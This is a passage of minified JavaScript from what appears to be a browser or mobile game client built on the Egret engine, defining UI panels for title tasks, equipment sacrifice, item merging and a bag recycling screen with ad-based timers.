void(f.TaskCT.ins().apparelTaskId==e.id?f.TaskCT.ins().sendTitle(3,e.id):f.TaskCT.ins().sendTitle(2,e.id));var n=u.GlobalConfig.TitleTaskConfig,o=n[f.TaskCT.ins().curTitleTaskId],s=null===(t=u.GlobalConfig.TitleConf[o.title])||void 0===t?void 0:t.activeItemId;if(s){if(!a.GlobalFun.checkCost(1,s))return;return void p.BagCT.ins().sendUseItem(s,1)}var r=e.value>=o.target;r?i||f.TaskCT.ins().sendTitle(1,e.id):g.TipsCT.ins().showTips(gettext("任务未完成"))},e.prototype.tabRp=function(){return f.TaskCT.ins().titleTaskRed.v},e.prototype.clearPanel=function(){},e}(l.BaseView);e.TitlePanel=y,window.TitlePanel=y,__reflect(y.prototype,"TitlePanel",[]),window.TitlePanel=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TitleItemRenderVo=e.TitleItemRender=void 0;var n=i(3),o=i(0),s=i(6),a=i(35),r=i(316),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.datas=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstCell.itemRenderer=r.TitleCellItemRender,this.lstCell.dataProvider=this.arc=new eui.ArrayCollection,this.lstCell.addEventListener(egret.Event.CHANGE,this.changeLst,this)},e.prototype.dataChanged=function(){var t=this.data;this.showRed.visible=!1;o.GlobalConfig.TitleTaskConfig;this.tabName.text=t.dirName,this.updateDatas(),this.lstCell.selectedIndex=t.selectedIndex},e.prototype.updateDatas=function(){this.datas.length=0,this.showRed.visible=!1,this.datas=a.TaskCT.ins().getDirListData(this.data);for(var t=0;t<this.datas.length;t++){var e=this.datas[t];if(e.target&&e.value>=e.target&&1!=e.state||1!=e.state&&e.activeItemId&&s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,e.activeItemId)){this.showRed.visible=!0;break}}this.arc.replaceAll(this.datas.concat())},Object.defineProperty(e.prototype,"selected",{get:function(){return egret.superGetter(e,this,"selected")},set:function(t){egret.superSetter(e,this,"selected",t),this.currentState=t?"show":"hide"},enumerable:!1,configurable:!0}),e.prototype.changeLst=function(t){var e=this.datas[this.lstCell.selectedIndex];a.TaskCT.ins().curTitleTaskId=e.id,this.data.selectedIndex=this.lstCell.selectedIndex,a.TaskCT.ins().postTitleChange()},e}(n.BaseItemRender);e.TitleItemRender=l,window.TitleItemRender=l,__reflect(l.prototype,"TitleItemRender",[]),window.TitleItemRender=l;var h=function(){function t(){}return t}();e.TitleItemRenderVo=h,window.TitleItemRenderVo=h,__reflect(h.prototype,"TitleItemRenderVo",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TitleCellItemRender=void 0;var n=i(3),o=i(6),s=i(10),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.taskName.text=this.data.taskName,this.taskName.textColor=s.ItemUtil.getQualityColor(this.data.rare),this.imgActive.visible=1==this.data.state;var t=this.data.target&&this.data.value>=this.data.target,e=1==this.data.state;this.showRed.visible=t&&!e||!e&&this.data.activeItemId&&!!o.BagCT.ins().getBagGoodsCountById(o.BagCT.BAG_TYPE_OTHTER,this.data.activeItemId)},e}(n.BaseItemRender);e.TitleCellItemRender=a,window.TitleCellItemRender=a,__reflect(a.prototype,"TitleCellItemRender",[]),window.TitleCellItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BaseDuoPanelWin=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e.panelTabIndex=-1,e.param=null,e}return __extends(e,t),e.prototype.open=function(t){void 0===t&&(t=-1);for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];this.baseTab&&(this.baseTab.selectedIndex=t,this.baseTab.validateNow(),this.baseViewStack&&(this.baseViewStack.selectedIndex=t))},e.prototype.getParam=function(){return[this.panelTabIndex,this.param]},e}(n.BaseView);e.BaseDuoPanelWin=o,window.BaseDuoPanelWin=o,__reflect(o.prototype,"BaseDuoPanelWin",[]),window.BaseDuoPanelWin=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBase_select=void 0;var n=i(19),o=i(3),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.item.touchEnabled=!1,this.item.touchChildren=!1,this.addTouchEvent(this,this.touch)},e.prototype.dataChanged=function(){var t=this.data;this.item.data=t},Object.defineProperty(e.prototype,"selected",{get:function(){return egret.superGetter(e,this,"selected")},set:function(t){egret.superSetter(e,this,"selected",t),this.imgSelect.visible=t},enumerable:!1,configurable:!0}),e.prototype.touch=function(){if(this.selected){var t=this.data;n.GlobalFun.showDetail(t.itemConfig,t)}},e}(o.BaseItemRender);e.ItemBase_select=s,window.ItemBase_select=s,__reflect(s.prototype,"ItemBase_select",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipSacrificePanel=void 0;var n=i(19),o=i(5),s=i(1),a=i(22),r=i(0),l=i(15),h=i(4),u=i(13),p=i(6),d=i(140),c=i(67),f=i(12),g=i(38),m=i(2),v=i(26),y=i(226),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EquipSacrifice",e.idx=-1,e.lockNum=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){observe(this,this.onEquipSelectChanged,p.BagCT.ins().setSelectEquipIdx),observe(this,this.updateView,g.EquipCT.ins().doEquipsacrificeReset),observe(this,this.doSacrificeHandler,g.EquipCT.ins().doEquipsacrificeUpdate),observe(this,this.changetabEquip,g.EquipCT.ins().changetabEquip),observe(this,this.saveHandler,g.EquipCT.ins().doEquipSacrificeBreakUp),observe(this,this.saveHandler,g.EquipCT.ins().doEquipSacrificeSave),observe(this,this.updateView,p.BagCT.ins().postItemChange),observe(this,this.updateView,p.BagCT.ins().postItemAdd),observe(this,this.updateView,p.BagCT.ins().postItemDel),observe(this,this.updateView,h.ActorCC.postGoldChange),this.addTouchEvent(this.breakup,this.onClick),this.addTouchEvent(this.save,this.onClick),this.addTouchEvent(this.btnRemove,this.onClick),this.addTouchEvent(this.btnCancel,this.onClick),this.addTouchEvent(this.btnBreakup,this.onClick),this.addTouchEvent(this.btnSuit,this.onClick),this.lstLock.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onlstLock,this),this.lstLock.dataProvider=this.lockAc=new eui.ArrayCollection([]),this.txtLvUp.visible=!1,p.BagCT.ins().setSelectEquipIdx(0)},e.prototype.removeDisplay=function(){g.EquipCT.ins().keepSacrifice=null,p.BagCT.ins().setSelectEquipIdx(-1)},e.prototype.onEquipSelectChanged=function(t){this.idx!=t&&(this.idx=t,this.updateIcon(),this.updateView(),this.setCurState(0),this.sacrificeState())},e.prototype.onlstLock=function(t){this.lstLock.selectedItems.length>this.lockNum&&(this.lstLock.selectedIndices.pop(),this.lstLock.selectedItems.pop()),this.lstLock.validateNow(),this.updateView()},e.prototype.onClick=function(t){var e=this.idx,i=g.EquipCT.ins().sacrificeArr,o=i[e],s=r.GlobalConfig.EquipSlotAffixBaseConfig[e][h.ActorCC.jobId][o.lv],a=r.GlobalConfig.EquipSlotAffixConfig[o.lv],l=n.GlobalFun.getItemCount(s.cost[0].id),u=n.GlobalFun.getItemCount(s.cost[1].id);switch(t.currentTarget){case this.breakup:if(v.ZsCT.ins().stage<a.zslv)return void m.TipsCT.ins().showTips(gettext("需要转生等级到达"+a.zslv+"转"));this.setCurState(1),this.breakUpState(a);break;case this.btnCancel:this.setCurState(0),this.sacrificeState();break;case this.btnBreakup:g.EquipCT.ins().sacrificeThrough(this.idx);break;case this.btnRemove:var p=s.cost[0].count*Math.pow(2,this.lstLock.selectedIndices.length);if(p>l)return void m.TipsCT.ins().showTips(gettext(n.GlobalFun.getItemName(s.cost[0].id)+"不足"));var d=s.cost[1].count*Math.pow(2,this.lstLock.selectedIndices.length);if(d>u)return void m.TipsCT.ins().showTips(gettext(n.GlobalFun.getItemName(s.cost[1].id)+"不足"));for(var c=[],f=0;f<this.lstLock.selectedIndices.length;f++){var y=this.lstLock.selectedIndices[f],C=s.attrLst[y];c.push(C)}g.EquipCT.ins().sacrificeLock(this.idx,c);break;case this.save:g.EquipCT.ins().sacrificeSave(this.idx);break;case this.btnSuit:win.open("EquipSacrificeSuitPanel",this.idx)}},e.prototype.saveHandler=function(t){void 0===t&&(t=!1),this.CleanData(),this.setCurState(0),this.sacrificeState(),this.updateView(),t&&(this.lstLock.selectedIndices=[])},e.prototype.updateView=function(){if(-1!=this.idx){var t=this.idx,e=g.EquipCT.ins().sacrificeArr,i=e[t],s=r.GlobalConfig.EquipSlotAffixBaseConfig[t][h.ActorCC.jobId][i.lv],l=r.GlobalConfig.EquipSlotAffixConfig[i.lv],u=r.GlobalConfig.EquipSlotAffixConfig[i.lv+1];this.lockNum=s.lockCount;var p=g.EquipCT.ins().getAttData(s.attrLst,i.attArr),d=a.AttributeData.getAttrBySacrifice(p),c=o.TextFlowMaker.generateTextFlow(d);this.NowSacrificeAttr.textFlow=c,this.txtNum.text=l.th/100+"%";var f=s.cost[0].count*Math.pow(2,this.lstLock.selectedIndices.length),m=s.cost[1].count*Math.pow(2,this.lstLock.selectedIndices.length);this.goldCost.text="/"+f,this.JLCost.text="/"+m;var v=n.GlobalFun.getItemCount(s.cost[0].id),y=n.GlobalFun.getItemCount(s.cost[1].id),C=v>=f?2149168:16711680,T=y>=m?2149168:16711680;this.goldCost.text="",this.goldOwn.text="",this.JLCost.text="",this.JLOwn.text="",this.lbMoneyName1.textFlow=o.TextFlowMaker.generateTextFlow(n.GlobalFun.getItemName(s.cost[0].id)+"：<font color="+C+">"+v+"</font>/"+f),this.lbMoneyName2.textFlow=o.TextFlowMaker.generateTextFlow(n.GlobalFun.getItemName(s.cost[1].id)+"：<font color="+T+">"+y+"</font>/"+m),this.range.text=l.range[0]/100+"%~"+l.range[1]/100+"%";var b=a.AttributeData.getAttrBySacrifice2(p,l.range),w="";if(u&&(w=a.AttributeData.getAttrBySacrifice2(p,u.range,":",65280)),this.lbBreakupCurAttr.textFlow=o.TextFlowMaker.generateTextFlow(b),this.lbBreakupNextAttr.textFlow=o.TextFlowMaker.generateTextFlow(w),this.checkTupo()&&l.th){var I=g.EquipCT.ins().keepSacrifice;this.btnBreakup.visible||I&&I.attArr.length||(this.breakup.visible=!0)}else this.btnBreakup.visible=!1,this.btnCancel.visible=!1,this.breakup.visible=!1;if(this.lstLock.validateNow(),!this.lstLock.numElements){var _=a.AttributeData.getAttrNumforSacrifice(p);this.setItemAtt(_)}}},e.prototype.setCurState=function(t){if(void 0===t&&(t=0),0==t){this.checkTupo()&&(this.breakup.visible=!0);var e=g.EquipCT.ins().keepSacrifice;e&&e.attArr.length>0&&(this.save.visible=!0),this.grDesc1.visible=!0,this.txtMax.visible=!1;var i=this.idx;if(-1!=i){var n=g.EquipCT.ins().sacrificeArr,o=n[i],s=r.GlobalConfig.EquipSlotAffixConfig[o.lv];s.th||(this.grDesc1.visible=!1,this.txtMax.visible=!0,this.breakup.visible=!1)}this.btnCancel.visible=!1,this.btnBreakup.visible=!1,this.lbBreakupNextAttr.visible=!1,this.lbBreakupCurAttr.visible=!1,this.btnRemove.visible=!0,this.NowSacrificeAttr.visible=!0,this.NextSacrificeAttr.visible=!0,this.lstLock.visible=!0,this.range.visible=!0}else this.breakup.visible=!1,this.btnRemove.visible=!1,this.btnCancel.visible=!0,this.btnBreakup.visible=!0,this.lbBreakupCurAttr.visible=!0,this.lbBreakupNextAttr.visible=!0,this.NowSacrificeAttr.visible=!1,this.NextSacrificeAttr.visible=!1,this.lstLock.visible=!1,this.save.visible=!1,this.range.visible=!1},e.prototype.sacrificeState=function(){if(-1!=this.idx){var t=this.idx,e=g.EquipCT.ins().sacrificeArr,i=e[t],s=r.GlobalConfig.EquipSlotAffixBaseConfig[t][h.ActorCC.jobId][i.lv];this.grCost1.visible=!0,this.grCost2.visible=!0,this.costGrp.visible=!1,this.lbMoneyName1.text=n.GlobalFun.getItemName(s.cost[0].id)+"：",this.lbMoneyName2.text=n.GlobalFun.getItemName(s.cost[1].id)+"：";var a=s.cost[0].count*Math.pow(2,this.lstLock.selectedIndices.length),l=s.cost[1].count*Math.pow(2,this.lstLock.selectedIndices.length),u=n.GlobalFun.getItemCount(s.cost[0].id),p=n.GlobalFun.getItemCount(s.cost[1].id),d=u>=a?2149168:16711680,c=p>=l?2149168:16711680;this.goldCost.text="",this.goldOwn.text="",this.JLCost.text="",this.JLOwn.text="",this.lbMoneyName1.textFlow=o.TextFlowMaker.generateTextFlow(n.GlobalFun.getItemName(s.cost[0].id)+"：<font color="+d+">"+u+"</font>/"+a),this.lbMoneyName2.textFlow=o.TextFlowMaker.generateTextFlow(n.GlobalFun.getItemName(s.cost[1].id)+"：<font color="+c+">"+p+"</font>/"+l);var f=g.EquipCT.ins().keepSacrifice;f&&f.attArr.length>0?this.save.visible=!0:this.save.visible=!1}},e.prototype.breakUpState=function(t){this.grDesc1.visible=!1,this.costGrp.visible=!0,this.grCost1.visible=!1,this.grCost2.visible=!1,this.costCm1.setData(t.breakCost[0],!0,!0),this.costCm2.setData(t.breakCost[1],!0,!0),t.breakCost||(this.txtMax.visible=!0)},e.prototype.setItemAtt=function(t){for(var e=t,i=[],n=0;e>n;n++){var o={};i.push(o)}this.lockAc.replaceAll(i)},e.prototype.doSacrificeHandler=function(){if(-1!=this.idx){var t=g.EquipCT.ins().keepSacrifice;t&&t.attArr.length>0?this.save.visible=!0:this.save.visible=!1,this.breakup.visible=!1;var e=g.EquipCT.ins().sacrificeArr[t.pos].lv,i=r.GlobalConfig.EquipSlotAffixBaseConfig[t.pos][h.ActorCC.jobId][e],n=g.EquipCT.ins().getAttData(i.attrLst,t.attArr),s=g.EquipCT.ins().sacrificeArr,l=s[t.pos],u=g.EquipCT.ins().getAttData(i.attrLst,l.attArr),p=a.AttributeData.getAttrBySacrifice(n,u),d=o.TextFlowMaker.generateTextFlow(p);this.NextSacrificeAttr.textFlow=d}},e.prototype.updateIcon=function(){var t=u.SubRoles.ins().getSubRoleByIndex(0),e=t.getEquipByIndex(this.idx);e&&(this.roleItem.setIndex(this.idx),this.roleItem.setModel(t),this.roleItem.setCurRole(t.index),this.roleItem.data=e.item,0==e.item.configID&&this.roleItem.setItemImg("xb_1"+d.ForgeConst.EQUIP_POS_TO_SUB[this.idx]))},e.prototype.checkTupo=function(){if(-1==this.idx)return!1;var t=this.idx,e=g.EquipCT.ins().sacrificeArr,i=e[t],n=r.GlobalConfig.EquipSlotAffixBaseConfig[t][h.ActorCC.jobId][i.lv],o=r.GlobalConfig.EquipSlotAffixConfig[i.lv];this.lockNum=n.lockCount;for(var s=g.EquipCT.ins().getAttData(n.attrLst,i.attArr),a=0;a<s.length;a++)if(s[a].value<o.th)return!1;return!0},e.prototype.changetabEquip=function(){this.CleanData(),this.cleanlockView(),this.updateView(),this.sacrificeState()},e.prototype.cleanlockView=function(){this.lstLock.selectedIndices=[],this.lstLock.selectedItems=[],this.lockAc.replaceAll([])},e.prototype.CleanData=function(){g.EquipCT.ins().keepSacrifice=new y.EquipSacrificeData,this.NextSacrificeAttr.textFlow=o.TextFlowMaker.generateTextFlow("")},e.openCheck=function(){var t=f.OpenSystem.ins().checkSysOpen(l.SystemType.equipSacrifice);return t||(m.TipsCT.ins().showTips(f.OpenSystem.ins().getNoOpenTips(l.SystemType.equipSacrifice)),win.open(c.View_BianQiang,2)),t},e}(s.BaseView);e.EquipSacrificePanel=C,window.EquipSacrificePanel=C,__reflect(C.prototype,"EquipSacrificePanel",[]),window.EquipSacrificePanel=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComposePanel=void 0;var n=i(16),o=i(1),s=i(0),a=i(13),r=i(6),l=i(321),h=i(322),u=i(227),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.idx=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.list.itemRenderer=h.ComposeMenuItem,this.listCont.itemRenderer=l.ComposeItem,this.listCont.dataProvider=new eui.ArrayCollection([]),this._tabListData=new eui.ArrayCollection,this.list.dataProvider=this._tabListData,observe(this,this.updateItemS,r.BagCT.ins().postItemAdd),this._tabListData.source=u.MergeCC.ins().getMergeMenu(),this.list.selectedIndex=this.idx,this.list.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemlistClick,this),this.addTouchEvent(this.btnjob1,this.Onclick),this.addTouchEvent(this.btnjob2,this.Onclick),this.addTouchEvent(this.btnjob3,this.Onclick),this.initView(),this.updateView(),this.list.validateNow()},e.prototype.removeDisplay=function(){if(this.skin){if(this.jobGrp.removeChildren(),this.removeObserve(),this.removeTouchEvent(this.btnjob1,this.Onclick),this.removeTouchEvent(this.btnjob2,this.Onclick),this.removeTouchEvent(this.btnjob3,this.Onclick),this.list&&this.list.removeEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemlistClick,this),this.list&&this.list.numChildren>0)for(var t=this.list.numChildren-1;t>=0;t--){var e=this.list.getChildAt(t);e&&e.clearAll()}if(this._tabListData&&this._tabListData.replaceAll([]),this.list&&(this.list.dataProvider=null),this.listCont&&this.listCont.numChildren>0)for(var t=this.listCont.numChildren-1;t>=0;t--){var e=this.listCont.getChildAt(t);e&&e.clearAll()}this.listCont&&(this.listCont.dataProvider=null)}},e.prototype.updateView=function(){var t=u.MergeCC.ins().getMergeSecMenu(this.list.selectedIndex+1);this.listCont.dataProvider=new eui.ArrayCollection(t);var e=s.GlobalConfig.MergeConfig[this.list.selectedIndex+1][1];this.jobGrp.visible=void 0==e.merge},e.prototype.updateItemS=function(){this.listCont.validateNow();for(var t=0;t<this.listCont.numElements;t++){var e=this.listCont.getElementAt(t);e&&e.itemUpdate()}},e.prototype.updateMenu=function(){for(var t=0;t<this.list.numChildren;t++){var e=this.list.getElementAt(t);e.iconDisplay.source=t==this.list.selectedIndex?"Role_yq3":"Role_yq4"}},e.prototype.updateBtn=function(){for(var t=1;3>=t;t++)this["btnjob"+t].iconDisplay.source=u.MergeCC.ins().mergeStr==this["btnjob"+t].name?"Role_yq3":"Role_yq4"},e.prototype.initView=function(){var t=s.GlobalConfig.MergeConfig[this.list.selectedIndex+1][1],e=a.SubRoles.ins().getSubRoleByIndex(0),i=void 0==t.merge?e.job+"":"";u.MergeCC.ins().mergeStr=i},e.prototype.onItemlistClick=function(t){this.list.selectedIndex!=this.idx&&(this.idx=this.list.selectedIndex,this.initView(),this.updateView())},e.prototype.Onclick=function(t){t.target.name!=u.MergeCC.ins().mergeStr&&(u.MergeCC.ins().changeList(t.target.name),this.updateView())},e.prototype.clearPanel=function(){if(this.list&&this.list.numElements>0)for(var t=this.list.numElements-1;t>=0;t--){var e=this.list.getElementAt(t);e&&n.DisplayUtils.removeFromParent(e)}if(this.listCont&&this.listCont.numElements>0)for(var t=this.listCont.numElements-1;t>=0;t--){var e=this.listCont.getElementAt(t);e&&n.DisplayUtils.removeFromParent(e)}n.DisplayUtils.removeFromParent(this.list)},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):this.list?(this.list.selectedIndex=t[0]||0,this.onItemlistClick(null)):t&&(this.idx=t[0]||0)},e}(o.BaseView);e.ComposePanel=p,window.ComposePanel=p,__reflect(p.prototype,"ComposePanel",[]),window.ComposePanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComposeItem=void 0;var n=i(24),o=i(19),s=i(3),a=i(11),r=i(0),l=i(36),h=i(4),u=i(6),p=i(31),d=i(10),c=i(2),f=i(227),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.itemArr=[],e}return __extends(e,t),e.prototype.createChildren=function(){observe(this,this.dataChanged,f.MergeCC.ins().changeList)},e.prototype.dataChanged=function(){this.content.removeChildren(),this.updateItem()},e.prototype.updateItem=function(){this.job=f.MergeCC.ins().mergeStr||"",this.itemArr=[];var t=this.data;if(t){var e=t.merge?t.merge:t["merge"+this.job],i=r.GlobalConfig.SyntheticConfig[e];if(i){for(var n=i.cost,o=0,s=0;s<n.length;s++){var l=new a.ItemBase;l.verticalCenter=0,this.itemArr.push(l),l.x=o,this.setItem(l,n[s]),this.content.addChild(l),o=o+92+10;var h=new eui.Image;h.verticalCenter=0,h.source=n.length-1==s?"rein_equal":"rein_mulit",h.x=o,this.content.addChild(h),o=o+28+10}var u=new a.ItemBase;u.x=o,u.verticalCenter=0,u.data=i.target[0],this.content.addChild(u),o=o+92+10,this.btn||(this.btn=new eui.Button);var p=r.GlobalConfig.MergeTotal[this.data.id];this.btn.verticalCenter=0,this.btn.skinName="Btn3Skin",this.btn.label=gettext(p.btn_text+""),this.addTouchEvent(this.btn,this.Onclick),this.btn.x=o,this.content.addChild(this.btn)}}},e.prototype.itemUpdate=function(){this.job=f.MergeCC.ins().mergeStr||"";var t=this.data;if(t){var e=t.merge?t.merge:t["merge"+this.job],i=r.GlobalConfig.SyntheticConfig[e];if(i)for(var n=i.cost,o=0;o<this.itemArr.length;o++)n[o]&&this.setItem(this.itemArr[o],n[o])}},e.prototype.setItem=function(t,e){var i,o,s="";if(e.id>2){var a=r.GlobalConfig.ItemConfig[e.id],c=d.ItemUtil.getQuality2(a);if(s="|C:"+p.QUALITY_COLOR[c]+"&T:"+a.name,i=u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_EQUIP,e.id)||u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_OTHTER,e.id),6==this.data.id)t.data=e;else{var f=r.GlobalConfig.ItemConfig[e.id];t.setItemImg(RES_DIR_ITEMICON+(f.icon+".png")),t.setImgBg2("quality"+c)}}else t.setItemImg(p.ITEM_ICON[p.ITEM_TYPE[e.id]]),s="|C:"+p.QUALITY_COLOR[0]+"&T:"+p.ITEM_NAME[e.id],i=e.id==l.MoneyConst.gold?h.ActorCC.gold:h.ActorCC.yb;o=e.count;var g=i>=o?4587386:16720161,m="\n|C:"+g+"&T:"+n.CommonUtils.overLength(i)+"/"+n.CommonUtils.overLength(o);t.setName(s+m)},e.prototype.Onclick=function(){var t=this.data,e=t.merge?t.merge:t["merge"+this.job],i=r.GlobalConfig.SyntheticConfig[e];if(i){for(var n,s=i.cost,a=[],p=0;p<s.length;p++){if(!o.GlobalFun.checkCost(s[p].count,s[p].id,"",!0,null,!0))return;if(s[p].id==l.MoneyConst.gold)a.push(Math.floor(h.ActorCC.gold/s[p].count));else{var d=u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_EQUIP,s[p].id)||u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_OTHTER,s[p].id)||h.ActorCC.getCurrencyByType(s[p].id);a.push(Math.floor(d/s[p].count))}}for(var p=0;p<a.length;p++)(!n||a[p]<n)&&(n=a[p]);return u.BagCT.ins().getAllSurplusCount(1)<0?void c.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void(1>=n?u.BagCT.ins().sendMerge(e):win.open("ItemCbTip",{configID:i.target[0].id,count:n,showCost:s,itemConfig:r.GlobalConfig.ItemConfig[i.target[0].id],mergeNum:e},"2"))}},e.prototype.clearAll=function(){this.itemArr=[],this.job=null,delMsg(this),this.content&&this.content.removeChildren()},e}(s.BaseItemRender);e.ComposeItem=g,window.ComposeItem=g,__reflect(g.prototype,"ComposeItem",[]),window.ComposeItem=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComposeMenuItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay&&this.data&&(this.labelDisplay.text=this.data.btn_source)
},e.prototype.clearAll=function(){this.skin&&this.data&&this.eRp&&(this.skinName="",this.data.name="",this.data=0,delMsg(this),this.labelDisplay.text="",this.eRp.source="",this.iconDisplay.source="",this.currentState="",RES.destroyRes("ComposeMenuItem"))},e}(n.BaseItemRender);e.ComposeMenuItem=o,window.ComposeMenuItem=o,__reflect(o.prototype,"ComposeMenuItem",[]),window.ComposeMenuItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagCallBackPanel=void 0;var n=i(8),o=i(90),s=i(61),a=i(5),r=i(1),l=i(17),h=i(0),u=i(124),p=i(57),d=i(91),c=i(48),f=i(13),g=i(30),m=i(23),v=i(25),y=i(7),C=i(85),T=i(2),b=i(27),w=i(6),I=i(167),_=i(189),S=i(228),x=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="bagCallBackSkin",e.onekeyName=["",gettext("一键\n回收"),gettext("一键\n熔炼"),gettext("一键\n分解"),gettext("一键\n回收")],e.openIdx=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=S.BagCallBackItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection,this.eTab.addEventListener(egret.Event.CHANGE,this.CHANGE,this),this.btnGo.visible=platform.getAdType()>0,this.numLab.visible=platform.getAdType()>0,this.baseTab=this.eTab},e.prototype.addDisplay=function(){observe(this,this.updateShopTime,w.BagCT.ins().updateCb),observe(this,this.updateList,w.BagCT.ins().updateCb),observe(this,this.updateAdNum,w.BagCT.ins().updateCb),observe(this,this.updateAdNum,m.GameLogic.ins().postAdReward),observe(this,this.updateShopInfo,w.BagCT.ins().postBagVolChange),observe(this,this.updateList,w.BagCT.ins().postItemChange),observe(this,this.updateList,w.BagCT.ins().postItemAdd),observe(this,this.updateList,w.BagCT.ins().postItemDel),observe(this,this.updateBtnRp,l.RedPointBaseSys.ins().RpChange),this.addTouchEvent(this.eCb0,this.onClick),this.addTouchEvent(this.eCb1,this.onClick),this.addTouchEvent(this.eCb2,this.onClick),this.addTouchEvent(this.eCb3,this.onClick),this.addTouchEvent(this.eCb4,this.onClick),this.addTouchEvent(this.eCb5,this.onClick),this.addTouchEvent(this.btnChange,this.onClick),this.addTouchEvent(this.btnGo,this.onClick),this.addTouchEvent(this.eAddBtn0,this.onClick),this.updateBtnRp(),this.openIdx>-1&&(this.eTab.selectedIndex=this.openIdx),this.updateShopInfo(),this.updateBySelected();var t=f.SubRoles.ins().getSubRoleByIndex(0);this.eCb2.label=c.Role.getJobNameByJob(t.job+Number(this.eCb2.name)>5?t.job+Number(this.eCb2.name)-5:t.job+Number(this.eCb2.name)),this.eCb3.label=c.Role.getJobNameByJob(t.job+Number(this.eCb3.name)>5?t.job+Number(this.eCb3.name)-5:t.job+Number(this.eCb3.name)),this.eCb4.label=c.Role.getJobNameByJob(t.job+Number(this.eCb4.name)>5?t.job+Number(this.eCb4.name)-5:t.job+Number(this.eCb4.name)),this.eCb5.label=c.Role.getJobNameByJob(t.job+Number(this.eCb5.name)>5?t.job+Number(this.eCb5.name)-5:t.job+Number(this.eCb5.name)),w.BagCT.ins().sendCb()},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1,Timer.stop(this.updateCountDown,this))},e.prototype.CHANGE=function(t){this.updateBySelected()},e.prototype.updateBySelected=function(){this.eCb0.visible=0==this.eTab.selectedIndex;var t=this.eCb0.visible&&this.eCb0.selected?"-1":"0";I.SmeltCC.setCbSignal(t),this.cbGroup1.visible=2==this.eTab.selectedIndex,this.eCb1.selected=this.cbGroup1.visible&&"0"==t,this.eCb2.selected=this.cbGroup1.visible&&"1"==t,this.eCb3.selected=this.cbGroup1.visible&&"2"==t,this.eCb4.selected=this.cbGroup1.visible&&"3"==t,this.eCb5.selected=this.cbGroup1.visible&&"4"==t,this.eAddBtn0.label=this.onekeyName[this.eTab.selectedIndex+1]||"",this.updateList()},e.prototype.updateAdNum=function(){if(2==platform.getAdType())if(w.BagCT.ins().shopAdCbTime>0){var t=s.LocationProperty.IOS_NO_AD_TIME-(y.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(C.Setting.ins().getValue(C.ClientSet.HuiShou_TIME)));this.btnGo.enabled=0>=t,this.updateCountDown(),t>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else Timer.stop(this.updateCountDown,this),this.numLab.text=gettext("看广告延长30分钟({0}次)",w.BagCT.ins().shopAdCbTime),this.btnGo.enabled=!0;else 1==platform.getAdType()?this.numLab.text=gettext("看广告延长30分钟({0}次)",w.BagCT.ins().shopAdCbTime):3==platform.getAdType()&&(this.btnGo.enabled=!0,this.numLab.text=gettext("看广告延长30分钟({0}次)",w.BagCT.ins().shopAdCbTime))},e.prototype.updateCountDown=function(){var t=s.LocationProperty.IOS_NO_AD_TIME-(y.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(C.Setting.ins().getValue(C.ClientSet.HuiShou_TIME)));t>0?this.numLab.text=n.DateUtils.getFormatBySecond(.001*t,n.DateUtils.TIME_FORMAT_3):(this.numLab.text=gettext("看广告延长30分钟({0}次)",w.BagCT.ins().shopAdCbTime),this.btnGo.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.onClick=function(t){var e=this;switch(t.target){case this.eCb0:case this.eCb1:case this.eCb2:case this.eCb3:case this.eCb4:case 